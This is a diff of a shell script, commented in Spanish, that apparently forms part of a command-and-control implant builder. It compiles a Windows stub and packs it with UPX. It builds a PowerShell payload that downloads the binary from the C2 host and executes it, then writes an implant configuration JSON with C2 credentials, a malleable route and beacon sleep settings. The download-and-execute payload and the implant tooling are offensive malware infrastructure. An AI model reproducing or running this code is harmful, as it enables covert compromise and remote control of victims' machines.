@@ -5680,3 +5680,40 @@ int main() {
 EOF
 x86_64-w64-mingw32-gcc -o stub.exe stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 -lmsvcrt && upx --best --ultra-brute  stub.exe
 echo "powershell -c \"Invoke-WebRequest 'http://$C2_HOST/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
+# === GENERAR ID ALEATORIO (12 caracteres alfanuméricos) ===
+ID=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
+
+# === FECHA ACTUAL ===
+CREATED=$(date '+%Y-%m-%d %H:%M:%S')
+
+# === RUTA DEL BINARIO (ajusta según tu estructura) ===
+BINARY_PATH="$(pwd)/${OUTPUT}"
+WORKING_PATH="$(pwd)"
+
+# === PAYLOAD (usando C2_HOST y OUTPUT) ===
+PAYLOAD="powershell -c \"Invoke-WebRequest 'http://${C2_HOST}/${OUTPUT}' -OutFile '${OUTPUT}'; Start-Process '${OUTPUT}'\""
+
+# === GENERAR EL ARCHIVO JSON ===
+cat > implant_config_$CLIENT_ID.json << EOF
+{
+    "id": "$ID",
+    "name": "$CLIENT_ID",
+    "binary": "$BINARY_PATH",
+    "url_binary": "http://${C2_HOST}/${OUTPUT}",
+    "os_id": "1",
+    "os": "windows",
+    "rhost": "",
+    "log": "${CLIENT_ID}.log",
+    "user_agent": "$USER_AGENT",
+    "maleable_route": "$MALEABLE",
+    "url": "$URL",
+    "sleep": "6",
+    "username": "$C2_USER",
+    "password": "$C2_PASS",
+    "working_path": "$WORKING_PATH",
+    "payload": "$PAYLOAD",
+    "created": "$CREATED"
+}
+EOF
+
+echo "✅ Archivo 'implant_config_windows.json' generado correctamente."
